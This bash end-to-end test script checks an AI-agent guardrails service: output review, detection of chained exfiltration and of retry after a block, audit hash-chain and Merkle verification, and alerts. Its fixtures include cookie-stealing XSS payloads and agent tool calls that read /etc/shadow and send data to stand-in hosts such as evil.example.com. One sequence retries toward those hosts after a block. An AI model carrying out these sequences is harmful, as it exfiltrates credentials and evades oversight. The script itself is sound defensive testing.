#!/usr/bin/env bash
# =============================================================================
# Guardrails E2E (no Kafka) — codifies the A/B/C feature verification.
#
# Boots this repo's control + engine on ALTERNATE ports (never touches a running
# 8080/8082), points the engine at a local mock Ollama, and exercises:
#
#   Engine (via HTTP + Redis):
#     B1/B3/B4  output review via POST /v1/evaluate role=output:
#               deterministic rules (XSS -> reject, credential -> redact+sanitized),
#               pipeline verdict (normal -> allow+warn)
#     B2        streaming-window review (stream_chunk=true) -> disposal
#     RATE      evaluate rate limiter v2: 30 windows of one trace unthrottled
#     FACADE    /v1/chat/completions is a pure local LLM facade (no review)
#     C1        chain pattern: sensitive read -> external egress (chain-exfil)
#     C2        retry-escape after a block (retry-escape)
#   Control (dev SQLite + new schema):
#     A3  trace-chain verify: valid 2-step chain passes, tampered row breaks at its seq
#     A3  audit hash-chain verify + daily-anchor seal + chain status
#     A4  Merkle proof + independent verify (correct root -> true, tampered -> false)
#     A6  Decision BOM reconstruction (and from an alert)
#     A7  encrypted export (AES-GCM, no plaintext leak) + export list/404
#     A8/B7 output-review stats (answer-level aggregation via trace_id)
#     C4  alerts lifecycle: seed -> list -> get -> ack -> BOM
#     C5  session checkpoint read path (seeded -> returned)
#
# Requires: java, curl, python3, sqlite3, a reachable Redis.
# Kafka is NOT required (engine audit events are queued async, dropped
# without a broker — stats checks seed the DB directly).
#
# Known gaps (need a Kafka broker + run-local.sh, not runnable here):
#   - audit/trace ingest -> auto alert generation, session checkpoint writes,
#     audit hash-chain / Merkle chaining, retention archive job.
#   - engine C0 chainAnomaly delta from an L3 Groovy rule (needs a rule store).
#   - MCP-proxy STI (B6) — Rust binary, separate harness.
#   - SDK streaming wrap_stream end-to-end — covered by
#     virbius-review-sdk tests + schemas/review-window-vectors.json.
#
# Usage:        bash scripts/test-guardrails-e2e.sh
# Skip build:   SKIP_BUILD=1 bash scripts/test-guardrails-e2e.sh
# Custom ports: CONTROL_PORT=18080 ENGINE_PORT=18082 MOCK_PORT=18999
# =============================================================================
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

CONTROL_PORT="${CONTROL_PORT:-18080}"
ENGINE_PORT="${ENGINE_PORT:-18082}"
MOCK_PORT="${MOCK_PORT:-18999}"
REDIS_URL="${VIRBIUS_REDIS_URL:-redis://127.0.0.1:6379}"

WORK="$(mktemp -d "${TMPDIR:-/tmp}/virbius-e2e.XXXXXX")"
LOGS="$WORK/logs"; DATA="$WORK/data"
mkdir -p "$LOGS" "$DATA"

PASS=0; FAIL=0
green(){ printf '\033[0;32m%s\033[0m\n' "$*"; }
red(){ printf '\033[0;31m%s\033[0m\n' "$*"; }
info(){ printf '\033[0;36m[INFO]\033[0m %s\n' "$*"; }
check(){ if [ "$1" = "1" ]; then PASS=$((PASS+1)); green "  PASS  $2"; else FAIL=$((FAIL+1)); red "  FAIL  $2"; fi; }

cleanup() {
  info "shutting down..."
  [ -n "${ENGINE_PID:-}" ] && kill "$ENGINE_PID" 2>/dev/null || true
  [ -n "${CONTROL_PID:-}" ] && kill "$CONTROL_PID" 2>/dev/null || true
  [ -n "${MOCK_PID:-}" ] && kill "$MOCK_PID" 2>/dev/null || true
  pkill -f "$WORK/mock_ollama.py" 2>/dev/null || true
  wait 2>/dev/null || true
  rm -rf "$WORK"
}
trap cleanup EXIT INT TERM

# ── preconditions ────────────────────────────────────────────────────────────
for bin in java curl python3 sqlite3; do
  command -v "$bin" >/dev/null 2>&1 || { red "missing required tool: $bin"; exit 2; }
done
if ! redis-cli -u "$REDIS_URL" ping 2>/dev/null | grep -q PONG; then
  red "Redis not reachable at $REDIS_URL (required by engine). Start redis-server or set VIRBIUS_REDIS_URL."
  exit 2
fi
APP_VER="$(grep -m1 '<version>' "$ROOT/pom.xml" | sed 's/.*<version>\(.*\)<\/version>.*/\1/')"
ENGINE_JAR="$ROOT/virbius-engine/target/virbius-engine-${APP_VER}.jar"
CONTROL_JAR="$ROOT/virbius-control/target/virbius-control-${APP_VER}.jar"

# ── build ────────────────────────────────────────────────────────────────────
if [ "${SKIP_BUILD:-0}" != "1" ] || [ ! -f "$ENGINE_JAR" ] || [ ! -f "$CONTROL_JAR" ]; then
  info "building engine + control (skip tests)..."
  mvn -q -pl virbius-engine,virbius-control -am package -DskipTests -Dskip.installnodenpm -Dskip.npm \
    || { red "build failed"; exit 2; }
fi
[ -f "$ENGINE_JAR" ] || { red "engine jar missing: $ENGINE_JAR"; exit 2; }
[ -f "$CONTROL_JAR" ] || { red "control jar missing: $CONTROL_JAR"; exit 2; }

# ── keys ─────────────────────────────────────────────────────────────────────
export VIRBIUS_LICENSE_MASTER_KEY="$(od -An -tx1 -N32 /dev/urandom | tr -d ' \n')"
export VIRBIUS_DELEGATED_MASTER_KEY="$(od -An -tx1 -N32 /dev/urandom | tr -d ' \n')"
EXPORT_KEY="$(openssl rand -base64 32 2>/dev/null || python3 -c 'import os,base64;print(base64.b64encode(os.urandom(32)).decode())')"

# ── mock Ollama ──────────────────────────────────────────────────────────────
cat > "$WORK/mock_ollama.py" <<PY
import json, http.server, socketserver
MALICIOUS = "Sure! Here is the snippet: <script>alert(document.cookie)</script> contact a@b.com"
NORMAL = "The weather today is sunny and warm."
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(n).decode('utf-8', 'ignore')
        try: req = json.loads(body or "{}")
        except Exception: req = {}
        content = MALICIOUS if "malicious" in json.dumps(req.get("messages", [])) else NORMAL
        if req.get("stream"):
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-ndjson')
            self.end_headers()
            for i in range(0, len(content), 20):
                self.wfile.write((json.dumps({"message": {"role": "assistant", "content": content[i:i+20]}, "done": False}) + "\n").encode())
            self.wfile.write((json.dumps({"message": {"role": "assistant", "content": ""}, "done": True}) + "\n").encode())
        else:
            out = json.dumps({"message": {"role": "assistant", "content": content},
                              "prompt_eval_count": 10, "eval_count": 20}).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(out)))
            self.end_headers()
            self.wfile.write(out)
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
socketserver.TCPServer(("127.0.0.1", $MOCK_PORT), H).serve_forever()
PY
python3 "$WORK/mock_ollama.py" > "$LOGS/mock.log" 2>&1 &
MOCK_PID=$!

wait_http(){ for _ in $(seq 1 40); do curl -sf --max-time 2 "$1" >/dev/null 2>&1 && return 0; sleep 1; done; return 1; }

# mock readiness: it must answer a chat POST before the engine forwards to it.
MOCK_READY=0
for _ in $(seq 1 30); do
  if curl -s --max-time 2 -X POST "http://127.0.0.1:$MOCK_PORT/api/chat" -d '{"messages":[]}' 2>/dev/null | grep -q '"message"'; then
    MOCK_READY=1; break
  fi
  sleep 0.5
done
if [ "$MOCK_READY" != "1" ]; then
  red "mock Ollama did not become ready on :$MOCK_PORT"; cat "$LOGS/mock.log" 2>/dev/null; exit 2
fi

info "starting engine on :$ENGINE_PORT..."
env VIRBIUS_DATA_DIR="$DATA" VIRBIUS_REDIS_URL="$REDIS_URL" \
    VIRBIUS_LICENSE_MASTER_KEY="$VIRBIUS_LICENSE_MASTER_KEY" \
    VIRBIUS_PROMPT_LLM_BASE_URL="http://127.0.0.1:$MOCK_PORT" \
    SPRING_PROFILES_ACTIVE=dev \
    java -jar "$ENGINE_JAR" --server.port="$ENGINE_PORT" \
      --virbius.ollama-base-url="http://127.0.0.1:$MOCK_PORT" \
    > "$LOGS/engine.log" 2>&1 &
ENGINE_PID=$!

info "starting control on :$CONTROL_PORT..."
env VIRBIUS_DATA_DIR="$DATA" VIRBIUS_REDIS_URL="$REDIS_URL" \
    VIRBIUS_LICENSE_MASTER_KEY="$VIRBIUS_LICENSE_MASTER_KEY" \
    VIRBIUS_DELEGATED_MASTER_KEY="$VIRBIUS_DELEGATED_MASTER_KEY" \
    SPRING_PROFILES_ACTIVE=dev \
    java -jar "$CONTROL_JAR" --server.port="$CONTROL_PORT" \
      --virbius.audit.export.key="$EXPORT_KEY" \
    > "$LOGS/control.log" 2>&1 &
CONTROL_PID=$!

wait_http "http://127.0.0.1:$ENGINE_PORT/admin/health" || { red "engine failed to start"; tail -n 30 "$LOGS/engine.log"; exit 2; }
wait_http "http://127.0.0.1:$CONTROL_PORT/api/v1/health" || { red "control failed to start"; tail -n 30 "$LOGS/control.log"; exit 2; }
info "services up."

E="http://127.0.0.1:$ENGINE_PORT"
C="http://127.0.0.1:$CONTROL_PORT/api/v1/admin/tenants/default"

# chat helper: retry a few times so a cold first-request never flakes the run.
chat(){ local body="$1" r=""; for _ in 1 2 3 4 5; do
  r=$(curl -s --max-time 20 -X POST "$E/v1/chat/completions" -H 'Content-Type: application/json' -d "$body");
  printf '%s' "$r" | grep -q '"choices"' && { printf '%s' "$r"; return 0; };
  sleep 1; done; printf '%s' "$r"; }

# ── engine scenarios ─────────────────────────────────────────────────────────
# warm-up (first chat request initializes the passthrough proxy)
chat '{"model":"m","messages":[{"role":"user","content":"hi"}]}' >/dev/null || true

# Output review is exposed via POST /v1/evaluate with role=output: the engine
# returns disposal_action (+ sanitized_content for redact) and the caller
# applies it verbatim. Streaming windows are reviewed the same way with
# stream_chunk=true (the official SDK wraps this; its windowing is covered by
# the shared vectors in schemas/review-window-vectors.json).
evout(){ curl -s --max-time 20 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' -d "$1"; }

info "E2E: engine output review via evaluate API (B1/B3/B4)"
R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-1","trace_id":"tr-out-1","content":"Sure! Here is the snippet: <script>alert(document.cookie)</script>"}')
V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action")=="reject" and d.get("effective_action")=="deny" else "0")' 2>/dev/null || echo 0)
[ "${E2E_DEBUG:-0}" = "1" ] && printf 'DBG R1=%s\n' "${R:0:220}" >&2
check "$V" "malicious output -> deny + disposal reject"

R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-2","trace_id":"tr-out-2","content":"leaked key AKIAABCDEFGHIJKLMNOP and mail a@b.com"}')
V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action")=="redact" and "[REDACTED_AWS_KEY]" in (d.get("sanitized_content") or "") and "[REDACTED_EMAIL]" in (d.get("sanitized_content") or "") else "0")' 2>/dev/null || echo 0)
check "$V" "credential leak -> disposal redact + sanitized_content"

R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-3","trace_id":"tr-out-3","content":"The weather today is sunny and warm."}')
V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action")=="warn" and d.get("effective_action")=="allow" else "0")' 2>/dev/null || echo 0)
check "$V" "normal output -> allow + disposal warn"

info "E2E: engine streaming-window output review (B2, stream_chunk=true)"
R=$(evout '{"tenant_id":"default","role":"output","tool_name":"chat_completion","session_id":"s-out-4","trace_id":"tr-out-4","stream_chunk":true,"content":"partial window <script>alert(1)</script>"}')
V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("disposal_action") in ("reject","omit") else "0")' 2>/dev/null || echo 0)
check "$V" "stream window malicious -> disposal reject/omit"

info "E2E: chat endpoint is a pure local LLM facade (no review)"
R=$(chat '{"model":"m","messages":[{"role":"user","content":"malicious"}]}')
V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("choices") and "virbius" not in d else "0")' 2>/dev/null || echo 0)
check "$V" "chat passthrough: no review object, no virbius key"

info "E2E: evaluate rate limit does not throttle streaming windows (v2)"
V=1
for i in $(seq 1 30); do
  evout "{\"tenant_id\":\"default\",\"role\":\"output\",\"tool_name\":\"chat_completion\",\"session_id\":\"s-rl\",\"trace_id\":\"tr-rl\",\"stream_chunk\":true,\"content\":\"window $i\"}" \
    | grep -q '"rate_limited"' && V=0
done
check "$V" "30 windows of one trace pass the rate limiter"

info "E2E: chain pattern detection (C1)"
SESS_C="e2e-c1-$$"
curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
  -d "{\"tenant_id\":\"default\",\"role\":\"tool_call\",\"session_id\":\"$SESS_C\",\"tool_name\":\"read_file\",\"args_json\":\"{\\\"path\\\":\\\"/etc/shadow\\\"}\",\"license_risk_quota\":100}" >/dev/null
R=$(curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
  -d "{\"tenant_id\":\"default\",\"role\":\"tool_call\",\"session_id\":\"$SESS_C\",\"tool_name\":\"curl\",\"args_json\":\"{\\\"url\\\":\\\"http://evil.example.com/collect\\\"}\",\"license_risk_quota\":100}")
V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("rule_id")=="chain-exfil" else "0")' 2>/dev/null || echo 0)
check "$V" "read /etc/shadow -> external curl => chain-exfil"

info "E2E: retry-escape detection (C2)"
SESS_R="e2e-c2-$$"
K="session:${SESS_R}:tool_history"
printf '%s' '{"tool_name":"read_file","args":"{\"path\":\"/etc/shadow\"}","allowed":false,"ts":1}' > "$WORK/h1"
printf '%s' '{"tool_name":"http_get","args":"{\"url\":\"http://evil/a\"}","allowed":true,"ts":2}'  > "$WORK/h2"
printf '%s' '{"tool_name":"curl","args":"{\"url\":\"http://evil/b\"}","allowed":true,"ts":3}'      > "$WORK/h3"
redis-cli -u "$REDIS_URL" DEL "$K" >/dev/null
redis-cli -u "$REDIS_URL" LPUSH "$K" "$(cat "$WORK/h1")" >/dev/null
redis-cli -u "$REDIS_URL" LPUSH "$K" "$(cat "$WORK/h2")" >/dev/null
redis-cli -u "$REDIS_URL" LPUSH "$K" "$(cat "$WORK/h3")" >/dev/null
R=$(curl -s --max-time 15 -X POST "$E/v1/evaluate" -H 'Content-Type: application/json' \
  -d "{\"tenant_id\":\"default\",\"role\":\"tool_call\",\"session_id\":\"$SESS_R\",\"tool_name\":\"fetch\",\"args_json\":\"{\\\"url\\\":\\\"http://evil/c\\\"}\",\"license_risk_quota\":100}")
V=$(printf '%s' "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("1" if d.get("rule_id")=="retry-escape" else "0")' 2>/dev/null || echo 0)
check "$V" "block + 2 changed retries + current => retry-escape"

# ── control scenarios ────────────────────────────────────────────────────────
info "E2E: control new schema present"
DB="$DATA/virbius-control.db"
TABLES=$(sqlite3 "$DB" ".tables" 2>/dev/null)
MISSING=""
for t in tb_alert tb_trace_chain_state tb_audit_daily_anchor tb_tenant_retention_policy tb_audit_export_job tb_session_checkpoint tb_audit_events_archive tb_agent_trace_archive; do
  printf '%s' "$TABLES" | grep -qw "$t" || MISSING="$MISSING $t"
done
check "$([ -z "$MISSING" ] && echo 1 || echo 0)" "new tables created by dev schema${MISSING:+ (missing:$MISSING)}"

info "E2E: seed one output audit event"
HASH="sha256:$(openssl rand -hex 32 2>/dev/null || python3 -c 'import os;print(os.urandom(32).hex())')"
sqlite3 "$DB" "INSERT INTO tb_audit_events (event_id,trace_id,tenant_id,scene,layer,rule_id,rule_revision,reason_code,effective_action,max_risk_score,rollout_state,intercepted_at,audit_seq,prev_hash,curr_hash) VALUES ('evt-e2e-1','tr-e2e-1','default','output','cloud','OUTPUT_XSS',1,'OUTPUT_XSS','deny',90,'full','2026-10-14T00:12:00Z',1,'sha256:0000000000000000000000000000000000000000000000000000000000000000','$HASH');"

info "E2E: output-review stats (A8/B7)"
V=$(curl -s "$C/audit/output-review-stats" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d["denied"]>=1 and d["deny_rate"]>0 else "0")' 2>/dev/null || echo 0)
check "$V" "output-review stats aggregates deny rate"

info "E2E: decision BOM (A6)"
V=$(curl -s "$C/audit/decision-bom/tr-e2e-1" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if len(d["audit_events"])>=1 else "0")' 2>/dev/null || echo 0)
check "$V" "decision BOM reconstructs audit events"

info "E2E: Merkle proof + verify (A4)"
ROOT=$(curl -s "$C/audit/proof/evt-e2e-1" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print(d["root_hash"] if d.get("found") and d.get("verified") else "")' 2>/dev/null || echo "")
check "$([ -n "$ROOT" ] && echo 1 || echo 0)" "Merkle proof found + self-verified"
V=$(curl -s -X POST "$C/audit/verify-proof" -H 'Content-Type: application/json' -d "{\"event_id\":\"evt-e2e-1\",\"root_hash\":\"$ROOT\",\"proof\":[]}" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["data"]["verified"] else "0")' 2>/dev/null || echo 0)
check "$V" "verify-proof (correct root) -> true"
V=$(curl -s -X POST "$C/audit/verify-proof" -H 'Content-Type: application/json' -d "{\"event_id\":\"evt-e2e-1\",\"root_hash\":\"sha256:deadbeef\",\"proof\":[]}" | python3 -c 'import sys,json;print("1" if not json.load(sys.stdin)["data"]["verified"] else "0")' 2>/dev/null || echo 0)
check "$V" "verify-proof (tampered root) -> false"

info "E2E: encrypted export (A7)"
JOB=$(curl -s -X POST "$C/audit/export" -H 'Content-Type: application/json' -d '{"min_risk":50}' | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print(d["job_id"] if d["status"]=="done" else "")' 2>/dev/null || echo "")
check "$([ -n "$JOB" ] && echo 1 || echo 0)" "export job completed"
if [ -n "$JOB" ]; then
  curl -s "$C/audit/export/$JOB/file" -o "$WORK/export.bin"
  SZ=$(wc -c < "$WORK/export.bin" | tr -d ' ')
  LEAK=0; grep -q "OUTPUT_XSS" "$WORK/export.bin" 2>/dev/null && LEAK=1
  check "$([ "$SZ" -gt 0 ] && [ "$LEAK" = "0" ] && echo 1 || echo 0)" "export artifact non-empty and encrypted (no plaintext)"
fi

info "E2E: trace-chain verify endpoint (A3)"
V=$(curl -s "$C/audit/trace-chain/verify" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if "sessions" in d else "0")' 2>/dev/null || echo 0)
check "$V" "trace-chain verify responds"

# ── A3 deep: valid chain passes / tampered chain breaks (seeded, no Kafka) ───
# Mirrors TraceEventIngestor.computeTraceHash so seeded rows look ingest-made.
cat > "$WORK/trace_hash.py" <<'PY'
import hashlib, json, sys
def g(d, k):
    v = d.get(k)
    return "" if v is None else str(v)
def canonical_ts(s):
    if s.endswith("Z"):
        s = s[:-1] + "+00:00"
    from datetime import datetime
    return str(int(datetime.fromisoformat(s).timestamp()))
def ch(prev, seq, d):
    parts = [prev, str(seq)] + [g(d, k) for k in (
        "tenant_id", "trace_id", "step_id", "step_type", "tool_name",
        "tool_args_hash", "tool_decision", "rule_id", "reason_code", "risk_score"
    )] + [canonical_ts(d["occurred_at"])]
    return "sha256:" + hashlib.sha256("|".join(parts).encode("utf-8")).hexdigest()
if __name__ == "__main__":
    print(ch(sys.argv[1], int(sys.argv[2]), json.loads(sys.argv[3])))
PY
GENESIS="sha256:$(printf '0%.0s' $(seq 1 64))"

seed_chain(){  # $1=session $2=trace $3=tamper(0|1)
  local sess="$1" trace="$2" tamper="${3:-0}"
  local r1 r2 h1 h2
  r1="{\"tenant_id\":\"default\",\"trace_id\":\"$trace\",\"step_id\":\"s1\",\"step_type\":\"tool_call\",\"tool_name\":\"read_file\",\"tool_args_hash\":\"aa\",\"tool_decision\":\"allow\",\"rule_id\":\"\",\"reason_code\":\"\",\"risk_score\":10,\"occurred_at\":\"2026-10-14T00:00:00Z\"}"
  r2="{\"tenant_id\":\"default\",\"trace_id\":\"$trace\",\"step_id\":\"s2\",\"step_type\":\"tool_call\",\"tool_name\":\"curl\",\"tool_args_hash\":\"bb\",\"tool_decision\":\"allow\",\"rule_id\":\"\",\"reason_code\":\"\",\"risk_score\":20,\"occurred_at\":\"2026-10-14T00:00:01Z\"}"
  h1=$(python3 "$WORK/trace_hash.py" "$GENESIS" 1 "$r1")
  h2=$(python3 "$WORK/trace_hash.py" "$h1" 2 "$r2")
  if [ "$tamper" = "1" ]; then h2="sha256:deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"; fi
  # every column that computeTraceHash reads MUST be inserted, else the row
  # hashes as "" for those fields and the chain never verifies.
  sqlite3 "$DB" "INSERT INTO tb_agent_trace (trace_id,session_id,tenant_id,step_id,step_seq,step_type,tool_name,tool_args_hash,tool_decision,rule_id,reason_code,risk_score,chain_seq,prev_hash,curr_hash,occurred_at) VALUES ('$trace','$sess','default','s1',1,'tool_call','read_file','aa','allow','','',10,1,'$GENESIS','$h1','2026-10-14T00:00:00Z');"
  sqlite3 "$DB" "INSERT INTO tb_agent_trace (trace_id,session_id,tenant_id,step_id,step_seq,step_type,tool_name,tool_args_hash,tool_decision,rule_id,reason_code,risk_score,chain_seq,prev_hash,curr_hash,occurred_at) VALUES ('$trace','$sess','default','s2',2,'tool_call','curl','bb','allow','','',20,2,'$h1','$h2','2026-10-14T00:00:01Z');"
}

seed_chain "e2e-tc-ok"  "tr-tc-ok"  0
seed_chain "e2e-tc-bad" "tr-tc-bad" 1
if [ "${E2E_DEBUG:-0}" = "1" ]; then
  printf 'DBG TC-OK=%s\nDBG TC-BAD=%s\n' "$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-ok")" "$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-bad")" >&2
fi
V=$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-ok" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d.get("passed") and d.get("verified_events")==2 else "0")' 2>/dev/null || echo 0)
check "$V" "trace-chain valid 2-step chain -> passed"
V=$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-bad" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if (not d.get("passed")) and d.get("break_seq")==2 else "0")' 2>/dev/null || echo 0)
check "$V" "trace-chain tampered row -> passed=false, break_seq=2"
V=$(curl -s "$C/audit/trace-chain/verify" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if any(s.get("session_id")=="e2e-tc-bad" for s in d.get("broken",[])) else "0")' 2>/dev/null || echo 0)
check "$V" "tenant trace-chain verify flags the tampered session"

info "E2E: audit hash-chain + daily anchor (A3)"
V=$(curl -s -X POST "$C/audit/verify" -H 'Content-Type: application/json' -d '{}' | python3 -c 'import sys,json;print("1" if "data" in json.load(sys.stdin) else "0")' 2>/dev/null || echo 0)
check "$V" "audit hash-chain verify endpoint responds"
V=$(curl -s -X POST "$C/audit/daily-anchor/seal" -H 'Content-Type: application/json' -d '{"date":"2026-10-14"}' | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["data"]["sealed_date"]=="2026-10-14" else "0")' 2>/dev/null || echo 0)
check "$V" "daily-anchor seal responds for given date"
ANCH=$(sqlite3 "$DB" "SELECT COUNT(*) FROM tb_audit_daily_anchor WHERE tenant_id='default' AND anchor_date='2026-10-14';" 2>/dev/null || echo 0)
check "$([ "${ANCH:-0}" -ge 1 ] 2>/dev/null && echo 1 || echo 0)" "daily-anchor row persisted for the day"
V=$(curl -s "$C/audit/chain/status" | python3 -c 'import sys,json;print("1" if "data" in json.load(sys.stdin) else "0")' 2>/dev/null || echo 0)
check "$V" "audit chain status responds"

info "E2E: alerts lifecycle (C4)"
ALERT_ID="alert-e2e-1"
sqlite3 "$DB" "INSERT INTO tb_alert (alert_id,tenant_id,trace_id,session_id,scene,rule_id,reason_code,risk_score,effective_action,status) VALUES ('$ALERT_ID','default','tr-e2e-1','s-out-1','output','OUTPUT_XSS','OUTPUT_XSS',90,'deny','open');"
V=$(curl -s "$C/alerts?status=open" | python3 -c "import sys,json;d=json.load(sys.stdin)['data'];print('1' if any(a['alert_id']=='$ALERT_ID' for a in d) else '0')" 2>/dev/null || echo 0)
check "$V" "alerts list contains seeded alert"
V=$(curl -s -X POST "$C/alerts/$ALERT_ID/ack?operator=e2e" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["data"]["acknowledged"] else "0")' 2>/dev/null || echo 0)
check "$V" "alert ack returns acknowledged=true"
V=$(curl -s "$C/alerts/$ALERT_ID" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d.get("acked_by")=="e2e" else "0")' 2>/dev/null || echo 0)
check "$V" "alert get shows acked_by"
V=$(curl -s "$C/alerts/$ALERT_ID/bom" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if len(d.get("audit_events",[]))>=1 else "0")' 2>/dev/null || echo 0)
check "$V" "alert BOM reconstructs its trace"
V=$(curl -s "$C/alerts/nope" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["code"]==404 else "0")' 2>/dev/null || echo 0)
check "$V" "alert get missing -> 404 code"

info "E2E: session checkpoint read path (C5)"
SESS_CK="e2e-cp-1"
sqlite3 "$DB" "INSERT INTO tb_session_checkpoint (tenant_id,session_id,last_chain_seq,last_occurred_at,event_count,tool_names,saved_at) VALUES ('default','$SESS_CK',7,'2026-10-14T00:00:00Z',12,'read_file,curl','2026-10-14T00:00:00Z');"
V=$(curl -s "$C/sessions/$SESS_CK/checkpoint" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d.get("event_count")==12 and "read_file" in (d.get("tool_names") or "") else "0")' 2>/dev/null || echo 0)
check "$V" "session checkpoint read returns seeded state"
V=$(curl -s "$C/sessions/nope/checkpoint" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["code"]==404 else "0")' 2>/dev/null || echo 0)
check "$V" "session checkpoint missing -> 404 code"

info "E2E: export ledger (A7)"
V=$(curl -s "$C/audit/export" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if len(d)>=1 else "0")' 2>/dev/null || echo 0)
check "$V" "export list shows the job"
V=$(curl -s "$C/audit/export/nope" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["code"]==404 else "0")' 2>/dev/null || echo 0)
check "$V" "export get missing -> 404 code"

# ── summary ──────────────────────────────────────────────────────────────────
echo
echo "==================== E2E summary ===================="
green "PASS: $PASS"
[ "$FAIL" -gt 0 ] && red "FAIL: $FAIL" || echo "FAIL: 0"
echo "logs: $LOGS (removed on exit; re-run with set -x to debug)"
[ "$FAIL" -eq 0 ] || exit 1
green "ALL CHECKS PASSED"
